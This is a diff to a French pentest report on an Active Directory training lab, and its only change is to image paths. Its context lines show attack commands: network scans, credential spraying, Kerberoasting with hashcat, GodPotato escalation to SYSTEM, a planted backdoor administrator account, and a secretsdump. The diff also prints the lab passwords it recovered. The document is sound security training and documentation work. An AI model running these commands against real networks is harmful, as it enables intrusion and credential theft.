@@ -58,7 +58,7 @@ L'infrastructure cible présente un nombre significatif de défauts de configura
 
 ### 1.3 Vue d'ensemble
 
-![alt text](image-19.png)
+![alt text](img/image-19.png)
 
 ---
 
@@ -195,7 +195,7 @@ sudo nmap -sn 192.168.56.0/24 -oN logs/p1-discovery-CG-13-05-2026.txt
 192.168.56.11   winterfell.north.sevenkingdoms.local
 192.168.56.22   castelblack.north.sevenkingdoms.local
 ```
-![alt text](image.png)
+![alt text](img/image.png)
 
 ### 5.2 Identification rapide des rôles via SMB
 
@@ -207,7 +207,7 @@ netexec smb 192.168.56.0/24 | tee logs/p1-netexec-smb-CG-13-05-2026.log
 
 **Output :**
 
-![alt text](image-1.png)
+![alt text](img/image-1.png)
 
 **Analyse :**
 
@@ -224,7 +224,7 @@ sudo nmap -sCV -p- --min-rate 1500 -oN logs/p1-nmap-kingslanding-CG-13-05-2026.n
 sudo nmap -sCV -p- --min-rate 1500 -oN logs/p1-nmap-winterfell-CG-13-05-2026.nmap   192.168.56.11
 sudo nmap -sCV -p- --min-rate 1500 -oN logs/p1-nmap-castelblack-CG-13-05-2026.nmap  192.168.56.22
 ```
-![alt text](image-2.png)
+![alt text](img/image-2.png)
 
 **Synthèse des ports ouverts :**
 
@@ -258,9 +258,9 @@ sudo nmap -sCV -p- --min-rate 1500 -oN logs/p1-nmap-castelblack-CG-13-05-2026.nm
 enum4linux-ng -A 192.168.56.11 -oA logs/p2-enum4linux-winterfell-CG-13-05-2026
 ```
 
-![alt text](image-3.png)
-![alt text](image-4.png)
-![alt text](image-5.png)
+![alt text](img/image-3.png)
+![alt text](img/image-4.png)
+![alt text](img/image-5.png)
 
 WINTERFELL autorise les sessions SMB nulles → l'énumération anonyme retourne :
 
@@ -287,7 +287,7 @@ netexec smb 192.168.56.11 -u samwell.tarly -p Heartsbane -d north.sevenkingdoms.
   | tee logs/p2-validate-samwell-CG-13-05-2026.log
 ```
 
-![alt text](image-6.png)
+![alt text](img/image-6.png)
 
 **Premier credential acquis** : `samwell.tarly:Heartsbane`
 
@@ -303,7 +303,7 @@ impacket-GetADUsers -all -dc-ip 192.168.56.11 \
 awk 'NR>3 && /\./ {print $1}' logs/p2-getadusers-north-CG-13-05-2026.log \
   > wordlists/north-users-CG-13-05-2026.txt
 ```
-![alt text](image-8.png)
+![alt text](img/image-8.png)
 
 ### 6.4 Vérification de la politique de verrouillage
 
@@ -311,7 +311,7 @@ awk 'NR>3 && /\./ {print $1}' logs/p2-getadusers-north-CG-13-05-2026.log \
 netexec smb 192.168.56.11 -u samwell.tarly -p Heartsbane --pass-pol \
   > logs/p2-pass-pol-CG-13-05-2026.log
 ```
-![alt text](image-7.png)
+![alt text](img/image-7.png)
 
 Politique détectée :
 - Longueur minimale : **5 caractères** (très faible) ;
@@ -387,7 +387,7 @@ L'option `--no-bruteforce` est essentielle : elle apparie chaque ligne du fichie
 SMB  192.168.56.11  445  WINTERFELL  [+] north.sevenkingdoms.local\hodor:hodor
 ```
 
-![alt text](image-9.png)
+![alt text](img/image-9.png)
 
 **Credential acquis** : `hodor:hodor`
 
@@ -432,7 +432,7 @@ netexec smb 192.168.56.11 192.168.56.22 \
   > logs/p4-validate-samwell-multi-CG-13-05-2026.log
 ```
 
-![alt text](image-10.png)
+![alt text](img/image-10.png)
 
 Le compte s'authentifie sur WINTERFELL et CASTELBLACK (membres du domaine NORTH). Il **échoue** sur KINGSLANDING (`STATUS_LOGON_FAILURE`), confirmant qu'il s'agit bien d'un utilisateur du sous-domaine uniquement.
 
@@ -476,7 +476,7 @@ impacket-GetUserSPNs \
 
 **Comptes à SPN découverts :**
 
-![alt text](image-11.png)
+![alt text](img/image-11.png)
 
 #### Cassage hors-ligne
 
@@ -491,7 +491,7 @@ hashcat -m 13100 \
 
 #### Résultat
 
-![alt text](image-12.png)
+![alt text](img/image-12.png)
 
 **Credential acquis** : `jon.snow:iknownothing`
 
@@ -506,7 +506,7 @@ netexec mssql 192.168.56.22 -u jon.snow -p iknownothing \
   > logs/p4-mssql-validate-CG-13-05-2026.log
 ```
 
-![alt text](image-13.png)
+![alt text](img/image-13.png)
 
 Le tag `(Pwn3d!)` de NetExec confirme les privilèges `sysadmin`.
 
@@ -542,7 +542,7 @@ netexec mssql 192.168.56.22 \
 
 **Output :**
 
-![alt text](image-14.png)
+![alt text](img/image-14.png)
 
 #### Analyse du résultat
 
@@ -559,7 +559,7 @@ netexec mssql 192.168.56.22 \
 
 **Output (extrait significatif) :**
 
-![alt text](image-15.png)
+![alt text](img/image-15.png)
 
 **`SeImpersonatePrivilege` confirmé** sur le compte `north\sql_svc`.
 
@@ -624,7 +624,7 @@ netexec mssql 192.168.56.22 \
 
 #### Résultat
 
-![alt text](image-20.png)
+![alt text](img/image-20.png)
 
 **OBJECTIF ATTEINT : `NT AUTHORITY\SYSTEM` sur CASTELBLACK** !
 
@@ -673,7 +673,7 @@ netexec mssql 192.168.56.22 \
 
 **Output :**
 
-![alt text](image-22.png)
+![alt text](img/image-22.png)
 
 GodPotato a basculé d'`NT AUTHORITY\NETWORK SERVICE` (compte porteur de `SeImpersonatePrivilege` exposé par le worker IIS/SQL) à `NT AUTHORITY\SYSTEM`, puis a créé en SYSTEM le compte `backdoorCG` et l'a ajouté au groupe `Administrators` local.
 
@@ -686,7 +686,7 @@ impacket-secretsdump 'backdoorCG:P@ssw0rd2026!@192.168.56.22' \
 
 **Output :**
 
-![alt text](image-23.png)
+![alt text](img/image-23.png)
 
 #### Analyse des trouvailles
 
@@ -797,7 +797,7 @@ Même sans DCSync finalisé, le bilan post-V06 est significatif :
 
 ### 9.2 Représentation graphique
 
-![alt text](image-18.png)
+![alt text](img/image-18.png)
 
 ### 9.3 Impact métier
 
